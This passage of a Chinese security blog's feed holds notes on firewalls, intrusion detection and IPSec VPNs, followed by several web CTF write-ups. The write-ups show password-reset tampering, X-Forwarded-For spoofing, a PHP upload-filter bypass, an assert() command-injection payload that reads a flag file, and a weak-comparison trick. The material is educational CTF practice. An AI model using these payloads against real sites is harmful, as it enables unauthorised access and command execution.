href="#2-双宿主机" class="headerlink" title="2.双宿主机"></a>2.双宿主机</h3><h3 id="3-屏蔽主机"><a href="#3-屏蔽主机" class="headerlink" title="3.屏蔽主机"></a>3.屏蔽主机</h3><h3 id="4-屏蔽子网"><a href="#4-屏蔽子网" class="headerlink" title="4.屏蔽子网"></a>4.屏蔽子网</h3><h2 id="45-入侵检测的分类及工作原理"><a href="#45-入侵检测的分类及工作原理" class="headerlink" title="45.入侵检测的分类及工作原理"></a>45.入侵检测的分类及工作原理</h2><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><h4 id="1-基于主机的入侵检测系统HIDS"><a href="#1-基于主机的入侵检测系统HIDS" class="headerlink" title="1.基于主机的入侵检测系统HIDS"></a>1.基于主机的入侵检测系统HIDS</h4><p>通过监视与分析主机的审计记录检测入侵；<br><strong>原理:</strong>安装在被检测的主机之上，主要是对该主机的网络实时连接以及系统审计日志进行智能分析和判断；<br>(更好的辨识分析、成本低/慢)</p><h4 id="2-基于网络的入侵检测系统NIDS"><a href="#2-基于网络的入侵检测系统NIDS" class="headerlink" title="2.基于网络的入侵检测系统NIDS"></a>2.基于网络的入侵检测系统NIDS</h4><p>通过在共享网段上对通信数据的侦听采集数据，分析可疑现象；<br><strong>原理：</strong>放置在比较重要的网段内，不停的监视网段中各种数据包。并对每个数据包进行特征分析，判断是否与系统内置的某些规则吻合；<br>(成本低、实时/只能检查直连网段、数据量大、复杂检测困难)</p><h4 id="3-分布式入侵检测系统"><a href="#3-分布式入侵检测系统" class="headerlink" title="3.分布式入侵检测系统"></a>3.分布式入侵检测系统</h4><p>检测网络中的数据包，与NIDS不同点：采用分布式检测，集中管理<br>(范围广/影响流量)</p><h1 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h1><h2 id="46-VPN的概念"><a href="#46-VPN的概念" class="headerlink" title="46.VPN的概念"></a>46.VPN的概念</h2><p>指的是在公用网络上利用加密与控制访问技术建立专用网络的技术；<br>分类1(按场合)：<br>1.远程访问VPN<br>2.网关-网关VPN<br><strong>主要技术：隧道技术、加密技术</strong><br>隧道：将一种协议的数据分装到另一种协议中进行传输的技术<br>加密：保护隧道中数据的安全传输<br>分类2(按隧道协议的实现层次)：<br>1.第二层隧道协议<br>主要：点到点，实现远程访问VPN<br>2.第三层隧道协议<br>主要：IP安全，用于网关-网关VPN，实现远程访问VPN<br>3.第四层隧道协议<br>处于传输层和应用层之前的一个安全子层；SSL/TLS；HTTPS</p><h2 id="47-IPSec-VPN：-熟记"><a href="#47-IPSec-VPN：-熟记" class="headerlink" title="47.IPSec VPN：(熟记)"></a>47.IPSec VPN：(熟记)</h2><p> IPSec:用于构建VPN的一系列协议，正在成为创建VPN的标准</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p><strong>IPSec只允许IP数据的封装和加密</strong><br>基于端对端的安全模式，在源IP和目的IP地址之间建立信任和安全性；<br>IPSec可保障主机之间、网络安全网关(如路由器或防火墙)之间或主机与安全网管之间的数据包安全；<br>可防范：数据嗅探、数据篡改、身份欺骗、重放攻击、拒绝服务攻击<br><strong>功能：</strong><br><strong>访问控制、无连接的完整性、数据源认证、防止重复攻击、机密性(加密)</strong></p><h3 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h3><p>IPSec协议体系主要包含8部分：<br>1.IP安全体系结构<br>2.封装安全载荷<br>3.验证头<br>4.加密算法<br>5.认证算法<br>6.密钥管理<br>7.解释域<br>8.策略</p><h3 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h3><p><strong>1.Internet密钥交换协议(IKE)</strong><br>&lt;提供协商安全参数和创建认证密钥&gt;<br><strong>2.封装协议</strong>：<br>(1)负载安全封装ESP：提供加密、认证和数据保护<br>(2)认证报头协议AH：提供认证和数据保护</p><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><p><strong>传输模式</strong>：两台主机之间(点到点)传递的数据加密<br><strong>隧道模式</strong>：两个不同网段(站点到站点)传送的数据内容加密或者两个私有IP网段穿越Internet连接<br>区别：数据包在传输过程中是否需要更改IP报头</p><h3 id="工作过程的3个阶段"><a href="#工作过程的3个阶段" class="headerlink" title="工作过程的3个阶段"></a>工作过程的3个阶段</h3><p>1.IPSec启动<br>2.IKE SA(IKE阶段1–主模式)<br>3.IPSec SA(IKE阶段2–快速模式)</p><h3 id="数据包封装"><a href="#数据包封装" class="headerlink" title="数据包封装"></a>数据包封装</h3><p>由ESP或AH或两种共同处理<br>AH：为IP数据报提供无连接的<strong>完整性和数据源认证</strong>的机制<br>ESP：提供了AH的大部分保护加上<strong>额外的机密性</strong>(使用DES、3DES、AES、RC5、IDEA)<br><strong>一般情况下使用ESP</strong></p><h3 id="IKE-熟记"><a href="#IKE-熟记" class="headerlink" title="IKE(熟记)"></a>IKE(熟记)</h3><p><strong>工作阶段及内容</strong><br>因特网密钥交换协议：<br>*用于协商IPSec安全关联，要求IPSec系统首先进行身份认证，并建立ISAKMP或IKE共享密钥<br>*SA包括两类：<br>1.IKE SA：双向<br>2.IPSec SA：单向的-&gt;建立双向VPN需要两个SA<br>主要负责：<br>*协商协议的参数<br>*交换公共密钥<br>*对双方进行验证<br>*在交换后对密钥进行管理</p><h3 id="安全关联SA"><a href="#安全关联SA" class="headerlink" title="安全关联SA"></a>安全关联SA</h3><p>SA：代表两对等体或两主机之间的契约，描述对等体将怎样使用IPSec安全服务来保护网络流量；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;网络安全概述&quot;&gt;&lt;a href=&quot;#网络安全概述&quot; class=&quot;headerlink&quot; title=&quot;网络安全概述&quot;&gt;&lt;/a&gt;网络安全概述&lt;/h1&gt;&lt;h2 id=&quot;1-网络安全的威胁来源（分类）&quot;&gt;&lt;a href=&quot;#1-网络安全的威胁来源（分类）&quot; class
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Bug</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Bug/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Bug/</id>
    <published>2019-12-09T01:18:21.000Z</published>
    <updated>2019-12-09T02:00:55.672Z</updated>
    
    <content type="html"><![CDATA[<p>给出一个登录页面;首先随便注册一个用户；<br><img src="https://s2.ax1x.com/2019/12/09/Qd5WsP.png" alt="Qd5WsP.png"><br>登录；<br><img src="https://s2.ax1x.com/2019/12/09/QdI9JJ.png" alt="QdI9JJ.png"><br>发现只有Manage是不能普通用户使用的；<br><img src="https://s2.ax1x.com/2019/12/09/QdIAL6.png" alt="QdIAL6.png"><br>最后发现还有个Finpwd，找回密码之前应该会验证身份，应该是突破口；<br>先以smtsec找回密码，发现直接给了一个newpwd输入框；应该是需要抓包修改用户身份；<br><img src="https://s2.ax1x.com/2019/12/09/QdIZdO.png" alt="QdIZdO.png"><br>修改为admin，提示修改成功；</p><p><img src="https://s2.ax1x.com/2019/12/09/QdIeoD.png" alt="QdIeoD.png"><br>以admin身份登录成功；<br>但是Manage还是不能使用提示IP not allowed!<br>应该要改为本地登录；在请求头中加入X-Forwarded-For: 127.0.0.1进行ip伪造；得到如下页面；<br><img src="https://s2.ax1x.com/2019/12/09/QdIuJH.png" alt="QdIuJH.png"><br>查看源码，看到提示：<br><img src="https://s2.ax1x.com/2019/12/09/QdIFQ1.png" alt="QdIFQ1.png"><br>看到filemanage想到可能do为upload(文件管理无非上传、下载、查看、删除)；<br>关于文件上传：<a href="https://blog.csdn.net/qq_42636435/article/details/88096844" target="_blank" rel="noopener">https://blog.csdn.net/qq_42636435/article/details/88096844</a><br><img src="https://s2.ax1x.com/2019/12/09/QdIPzR.png" alt="QdIPzR.png"><br>根据提示Just image？因该是上传image然后改后缀；<br>构造： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line">    phpinfo();</span><br><span class="line">？&gt;</span><br></pre></td></tr></table></figure><p>上传发现，过滤了<?php?>;<br>不是php文件又不能进行解析得到响应；<br>非php文件下提示要上传php文件；<br>It is not a really php file<br>这里尝试使用php的脚本表达形式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">'php'</span>&gt;</span><br><span class="line">phpinfo();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/09/QdIksx.png" alt="QdIksx.png"><br>将jpg后缀改为php4/php5;(否则不能解析)就得到响应flag了.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给出一个登录页面;首先随便注册一个用户；&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/09/Qd5WsP.png&quot; alt=&quot;Qd5WsP.png&quot;&gt;&lt;br&gt;登录；&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/20
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>NaNNaNNaNNaN-Batman</title>
    <link href="https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/"/>
    <id>https://singlemindedt.github.io/2019/12/09/NaNNaNNaNNaN-Batman/</id>
    <published>2019-12-09T01:08:23.000Z</published>
    <updated>2019-12-09T03:17:13.953Z</updated>
    
    <content type="html"><![CDATA[<p>NaNNaNNaNNaN-Batman<br>下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框；<br><img src="https://s2.ax1x.com/2019/12/09/Qdz3Ct.png" alt="Qdz3Ct.png"><br>但是输入没有任何响应；回头再看看代码；<br><img src="https://s2.ax1x.com/2019/12/09/QdzGgf.png" alt="QdzGgf.png"><br>可以很明显看到,’<em>’是一个变量，而它的内容就是后面一长串字符(三行绿色部分即’’中间部分)；最后eval(</em>)函数执行_;<br>**<br>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>**<br>此处，eval()并未执行$()函数，而是执行了字符串，导致乱码?:).<br>为了能看到正常源码，将eval()改为alert()；<br>**<br>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。<br>alert是HTML DOM 中用到的一种脚本语言，它的中文意思是“提醒”。它是JavaScript或VBscript脚本语言中窗口window对象的一个常用方法；其主要用法就是在你自己定义了一定的函数以后，通过执行相应的操作，所弹出对话框的语言。并且alert对话框通常用于一些对用户的提示信息。<br>|alert(message)| |<br>|:——–:|:————-:|<br>|参数    |描述|<br>|message    |要在 window 上弹出的对话框中显示的纯文本（而非 HTML 文本）|<br>**<br><img src="https://s2.ax1x.com/2019/12/09/Qdzl4I.png" alt="Qdzl4I.png"><br>即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p>**<br>match() 方法可在字符串内检索指定的值，或找到一个或多个正则表达式的匹配。<br>splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。(应该是从var后的几个值中挑选几个，组合得到flag)<br>**<br>方法一：审计，变量e需要满足五个条件。长度为16；^表示开头一定要匹配到be0f23，$表示结尾一定要匹配到e98aa,其它的只要匹配到就行，没有位置要求；所以可以构造出：e==be0f233ac7be98aa<br>在OK输入框中输入可以得到flag；<br>方法二：由于程序已经固定只是在输入时需要检测是否匹配，那么可以直接省去输入匹配部分，直接执行关键组合flag部分；提取如下代码，在控制台执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">"c"</span>).value;</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">var</span> t=[<span class="string">"fl"</span>,<span class="string">"s_a"</span>,<span class="string">"i"</span>,<span class="string">"e&#125;"</span>];</span><br><span class="line">    <span class="keyword">var</span> n=[<span class="string">"a"</span>,<span class="string">"_h0l"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> r=[<span class="string">"g&#123;"</span>,<span class="string">"e"</span>,<span class="string">"_0"</span>];</span><br><span class="line">    <span class="keyword">var</span> i=[<span class="string">"it'"</span>,<span class="string">"_"</span>,<span class="string">"n"</span>];</span><br><span class="line">    <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">    &#123;  </span><br><span class="line">      <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'&lt;input id="c"&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;'</span>);</span><br><span class="line">    <span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/09/QdzJv8.png" alt="QdzJv8.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;NaNNaNNaNNaN-Batman&lt;br&gt;下载附件，得到web100的文本，打开是乱码，大概看了下，将后缀改为HTML，在浏览器里打开，得到一个OK输入框；&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/09/Qdz3Ct.png&quot; 
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Training-WWW-Robots</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Training-WWW-Robots/</id>
    <published>2019-12-09T01:03:58.000Z</published>
    <updated>2019-12-09T03:23:26.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h1><p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。<br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。<br>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。<br>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。(摘自百度百科)<br>访问robots.txt，发现不允许访问fl0g.php<br><img src="https://s2.ax1x.com/2019/12/09/QdzbrD.png" alt="QdzbrD.png"><br>尝试访问/fl0g.php，得到flag；<br><img src="https://s2.ax1x.com/2019/12/09/Qdzqqe.png" alt="Qdzqqe.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Training-WWW-Robots&quot;&gt;&lt;a href=&quot;#Training-WWW-Robots&quot; class=&quot;headerlink&quot; title=&quot;Training-WWW-Robots&quot;&gt;&lt;/a&gt;Training-WWW-Robots&lt;/h1&gt;&lt;p&gt;ro
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Mfw</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Mfw/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Mfw/</id>
    <published>2019-12-09T00:58:05.000Z</published>
    <updated>2019-12-09T03:09:04.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Mfw"><a href="#Mfw" class="headerlink" title="Mfw"></a>Mfw</h1><p>打开链接，几个目录都看了下，发现：<br><img src="https://s2.ax1x.com/2019/12/09/QdvaQS.png" alt="QdvaQS.png"><br>可能存在git源码泄露，尝试访问.git目录：<br><img src="https://s2.ax1x.com/2019/12/09/Qdvron.png" alt="Qdvron.png"><br>利用Githack得到网站源码(直接将GitHack.py拖入cmd,输入执行命令)：<br><img src="https://s2.ax1x.com/2019/12/09/QdvwLQ.png" alt="QdvwLQ.png"><br>在GitHack目录下可以看到网站源码文件夹：<br><img src="https://s2.ax1x.com/2019/12/09/QdvNz8.png" alt="QdvNz8.png"><br>在flag.php中只有如下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// $FLAG = '';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是将flag.php中的内容注释了，不显在网页上。<br>在index.php中发现关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>**<br>assert()这个函数在php语言中是用来判断一个表达式是否成立。返回true or false;<br>/<em>PHP官方文档是怎么解释的：<br>    assert — 检查一个断言是否为 FALSE<br>    PHP 5<br>    bool assert ( mixed $assertion [, string $description ] )<br>    PHP 7<br>    bool assert ( mixed $assertion [, Throwable $exception ] )<br>    assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>    如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br>断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。<br>*/<br>die() 函数输出一条消息，并退出当前脚本；<br>strpos(string,find,start)查找find在字符串string中第一次出现的位置;<br>file_exists() 函数检查文件或目录是否存在。如果指定的文件或目录存在则返回 TRUE，否则返回 FALSE。<br>*</em><br>如此这般，可以利用assert()函数执行命令，类似sql注入，在数据库中查找，构造url为page=abc’) or system(“cat templates/flag.php”);//<br>{用lww’)闭合前半部分，得到false；之后执行system();//注释掉后面的代码；<br><img src="https://s2.ax1x.com/2019/12/09/QdvBZj.png" alt="QdvBZj.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Mfw&quot;&gt;&lt;a href=&quot;#Mfw&quot; class=&quot;headerlink&quot; title=&quot;Mfw&quot;&gt;&lt;/a&gt;Mfw&lt;/h1&gt;&lt;p&gt;打开链接，几个目录都看了下，发现：&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/12/09/Qdva
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Lottery!</title>
    <link href="https://singlemindedt.github.io/2019/12/09/Lottery/"/>
    <id>https://singlemindedt.github.io/2019/12/09/Lottery/</id>
    <published>2019-12-09T00:49:07.000Z</published>
    <updated>2019-12-09T03:14:03.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lottery！"><a href="#Lottery！" class="headerlink" title="Lottery！"></a>Lottery！</h1><p>随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机数；<br><img src="https://s2.ax1x.com/2019/12/09/Qdvyiq.png" alt="Qdvyiq.png"><br>根据Claim Your Prize中的提示，需要花费$9990000才能买到flag，如果一直猜数字获得余额不太现实，<br><img src="https://s2.ax1x.com/2019/12/09/Qdv6J0.png" alt="Qdv6J0.png"><br>用burpsuite对输入彩票数字验证过程抓包，得到api.php;<br><img src="https://s2.ax1x.com/2019/12/09/QdvcWV.png" alt="QdvcWV.png"><br>不过还是不太清楚怎么搞，看了下wp，说是git源码泄露：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br>尝试访问：<br><img src="https://s2.ax1x.com/2019/12/09/Qdx5jS.png" alt="Qdx5jS.png"><br>可以利用Githack提取下载源码；(但其实本题直接在附件里给出了网站源码、滑稽.gif)<br>打开之前下载好的源文件：<br><img src="https://s2.ax1x.com/2019/12/09/QdvgzT.png" alt="QdvgzT.png"><br>打开api.php文件，可以看到以下验证彩票数字代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">    $same_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">            $same_count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ($same_count) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $prize = <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            $prize = <span class="number">20</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            $prize = <span class="number">300</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            $prize = <span class="number">1800</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            $prize = <span class="number">200000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            $prize = <span class="number">5000000</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $prize = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，代码将用户输入的7个数与7个随机数比较，并且用的==(弱类型比较),因为json支持bool数据，所以我们可以直接用true来使==成立；<br>改包：<br><img src="https://s2.ax1x.com/2019/12/09/QdvRQU.png" alt="QdvRQU.png"><br>发现已经获得$200000;多提交几余额就够了，buy-&gt;flag；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lottery！&quot;&gt;&lt;a href=&quot;#Lottery！&quot; class=&quot;headerlink&quot; title=&quot;Lottery！&quot;&gt;&lt;/a&gt;Lottery！&lt;/h1&gt;&lt;p&gt;随便输入7个数字得到以下结果，并且每次的winning numbers都是不同的，应该为随机
      
    
    </summary>
    
